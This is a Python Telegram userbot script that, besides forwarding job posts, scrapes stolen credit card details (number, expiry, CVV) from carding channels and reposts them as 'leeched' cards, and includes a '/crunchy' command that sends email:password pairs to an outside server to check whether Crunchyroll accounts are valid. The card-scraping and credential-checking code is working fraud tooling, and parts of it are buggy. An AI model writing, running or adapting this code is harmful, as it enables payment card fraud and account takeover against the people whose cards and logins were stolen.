from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon import events
import os
from re import findall, compile, DOTALL
from keep_alive import keep_alive

# Credentials.
api_id = int(os.environ.get("API_ID"))
api_hash = os.environ.get("API_HASH")
ss = os.environ.get("STRING_SESSION")

# Main

def formatMessage(text):
    splited = text.split("\n")
    res = ""
    for each in splited:
        res += each.strip() + "\n"
    return res

def fetchKeyword(keyword, source):
    return len(findall(rf"\b{keyword}\b", source)) >= 1


def getJobRole(job):
    if fetchKeyword("android", job):
        return "android"
    elif fetchKeyword("mobile", job):
        return "android"
    elif fetchKeyword("application", job):
        return "android"
    elif fetchKeyword("mobile app", job):
        return "android"
    elif fetchKeyword("android app", job):
        return "android"
    elif fetchKeyword("android developer", job):
        return "android"
    elif fetchKeyword("mobile developer", job):
        return "android"
    elif fetchKeyword("application developer", job):
        return "android"
    elif fetchKeyword("software application", job):
        return "android"
    elif fetchKeyword("full stack", job):
        return "full_stack"
    elif fetchKeyword("fullstack", job):
        return "full_stack"
    else:
        return "null"

    return "null"


def isApprovedCreditCard(cc):
    if len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b).(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b).(\bcharged\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)\$", cc)) >= 1:
        return True
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)\$", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b)\$.(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", cc)) >= 1:
        return True
    elif len(findall(r"(\b\d{1,2}\b)\$.(\bcharged\b)", cc)) >= 1:
        return True
    elif fetchKeyword("𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱", cc):
        return True
    elif fetchKeyword("approved", cc):
        return True
    else:
        return False
    return False


# Filter Jobs Channels
fuel_jobs = []
jobs = os.environ.get("JOBS").split(",")
for job in jobs:
    job = job.strip()
    if "-" in job:
        fuel_jobs.append(int(job))
    elif "" == job:
        pass
    else:
        fuel_jobs.append(job)

# Filter CC Channels
fuel_credit_card = []
cc = os.environ.get("CC").split(",")
for c in cc:
    c = c.strip()
    if "-" in c:
        fuel_credit_card.append(int(c))
    elif "" == c:
        pass
    else:
        fuel_credit_card.append(c)

# Filter Credit Cards From Each Message.
def filter_pattern(message):

    pattern1 = compile(
        r"(\b\d{15,16}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)",
        DOTALL,
    )
    pattern2 = compile(
        r"(\b\d{15,16}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)",
        DOTALL,
    )
    pattern3 = compile(
        r"(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)",
        DOTALL,
    )
    pattern4 = compile(
        r"(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b).(\b\d{4}\b)[a-zA-Z\W]*?(\b\d{3,4}\b)[a-zA-Z\W]*?(\b\d{2}\b)[a-zA-Z\W]*?(\b\d{2,4}\b)",
        DOTALL,
    )
    result = []
    pattern = 1
    result = pattern1.findall(message)
    if result == []:
        pattern = 2
        result = pattern2.findall(message)
        if result == []:
            pattern = 3
            pattern3.findall(message)
            if result == []:
                pattern = 4
                pattern4.findall(message)
    return result, pattern


def filter_cc(cc):
    matches, pattern = filter_pattern(cc)
    cc, mm, yy, cvv = "", "", "", ""
    for match in matches:
        if pattern == 1:
            cc = match[0]
            mm = match[1]
            yy = match[2]
            cvv = match[3]
        elif pattern == 2:
            cc = match[0]
            mm = match[2]
            yy = match[3]
            cvv = match[1]
        elif pattern == 3:
            cc = "".join(match[0:4])
            mm = match[4]
            yy = match[5]
            cvv = match[6]
        elif pattern == 4:
            cc = "".join(match[0:4])
            mm = match[5]
            yy = match[6]
            cvv = match[4]
        if len(yy) < 4:
            yy = "20" + yy
    return f"{cc}|{mm}|{yy}|{cvv}"


def create_response(message):
    status = "ᴀᴘᴘʀᴏᴠᴇᴅ"
    mes = message.lower()

    if "ccn" in mes:
        status += " ᴄᴄɴ"
    elif len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b).(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b).(\bcharged\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b).(\b\d{1,2}\b)\$", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\bcharged\b).(\b\d{1,2}\b)\$", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b)\$.(\b𝗖𝗵𝗮𝗿𝗴𝗲𝗱\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif len(findall(r"(\b\d{1,2}\b)\$.(\bcharged\b)", mes)) >= 1:
        status = "ᴄʜᴀʀɢᴇᴅ ᴄᴠᴠ"
    elif "incorrect cvc" in mes:
        status += " ᴄᴄɴ"
    elif "invalid postal code" in mes:
        status += " ᴡʀᴏɴɢ ᴢɪᴘ"
    elif "declined cvv" in mes:
        status += " ᴄᴄɴ"
    elif "insufficient fund" in mes or "not enough balance" in mes:
        status = "ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ ꜰᴜɴᴅꜱ"
    elif "cvv" in message.lower():
        status += " ᴄᴠᴠ"

    credit_card = filter_cc(message)
    if len(credit_card) <= 3:
        return "null"

    credit_card = credit_card.split("|")
    text_1 = f"""
    [✯] 𝗦𝗣𝗬𝗧𝗨𝗕𝗘 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
    ━━━━━━━━━━━━━━━━
    [✯] **ᴄᴄ** ↯ `{credit_card[0]}`
    [✯] **ᴇxᴘɪʀʏ** ↯ `{credit_card[1]}/{credit_card[2]}`
    [✯] **ᴄᴠᴄ** ↯ `{credit_card[3]}`
    [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ {status} ✅
    ━━━━━━━━━━━━━━━━
    [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
    [✯] **ʟᴇᴇᴄʜᴇᴅ ʙʏ** ↯ @xCatBurglar [𝙿𝚁𝙴𝙼𝙸𝚄𝙼]
    [✯] **ᴅᴇᴠᴇʟᴏᴘᴇʀ** ↯ @x4rju9 ⚜️"""

    return text_1


def main():
    with TelegramClient(StringSession(ss), api_id, api_hash) as client:

        @client.on(events.NewMessage(chats=fuel_jobs))
        async def find_jobs(event):
            job = event.raw_text
            result = getJobRole(job.lower())

            if "android" in result:
                await client.send_message("x4rju9", job, link_preview=False)
            elif "full_stack" in result:
                await client.send_message(-1002236063557, job, link_preview=False)

        @client.on(events.NewMessage(chats=fuel_credit_card))
        @client.on(events.MessageEdited(chats=fuel_credit_card))
        async def cc_leecher(event):
            cc = event.raw_text
            result = isApprovedCreditCard(cc.lower())

            if result:
                response = create_response(cc)
                if response == "null":
                    return
                response = formatMessage(response)
                await client.send_message(-1001769821742, response, link_preview=False)

        @client.on(events.NewMessage(pattern=r"^(?:@xCatBurglar /crunchy|/crunchy)"))
        async def handler(event):
            print(event.raw_text)
            result = findall(r"([a-zA-Z0-9_\-\.]+@.*)\:(.*)", event.raw_text)
            if not len(result) >= 1:
                return
            result = result[0]
            url = f"https://daydreamerwalk.com/c.php?e={result[0]}&p={result[1]}"
            # Response from the server
            response = requests.post(url=url)
            # List of premium users
            premium_users = ["x4rju9"]
            # Membership status
            memebership = "𝙵𝚁𝙴𝙴"
            # Getting the sender infor to extract the username
            user = await event.get_sender()
            user = user.username
            # Setting membership status based on the who accesses it
            if user == "x4rju9":
                memebership = "𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁"
            elif user in premium_users:
                memebership = "𝙿𝚁𝙴𝙼𝙸𝚄𝙼"
            # Password security: whether to hide or not
            uPass = result[1]
            if not event.is_private:
                uPass = 'x'*len(uPass)
            # Response of whether the credentials are valid or invalid
            status = "ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ᴍɪꜱᴍᴀᴛᴄʜ ‼"
            if "premium" in response.text:
                status = "ᴀᴘᴘʀᴏᴠᴇᴅ ᴘʀᴇᴍɪᴜᴍ ✅"
            else:
                uPass = result[1]
            # Creating Response Format
            res = f"""
            [✯] 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 ⚡ 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 
            ━━━━━━━━━━━━━━━━
            [✯] **ᴇᴍᴀɪʟ** ↯ `{result[0]}`
            [✯] **ᴘᴀꜱꜱ** ↯ `{uPass}`
            [✯] **ʀᴇꜱᴘᴏɴꜱᴇ** ↯ `{status}`
            ━━━━━━━━━━━━━━━━
            [✯] **ᴘʀᴏxʏ** ↯ ʟɪᴠᴇ ☘️
            [✯] **ᴄʜᴇᴄᴋᴇᴅ ʙʏ** ↯ @{user} [{memebership}]
            [✯] **ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ** ↯ @x4rju9 ⚜️"""
            res = formatMessage(res)
            await event.reply(res)

        # start bot
        client.start()
        client.run_until_disconnected()


if __name__ == "__main__":
    keep_alive()
    main()
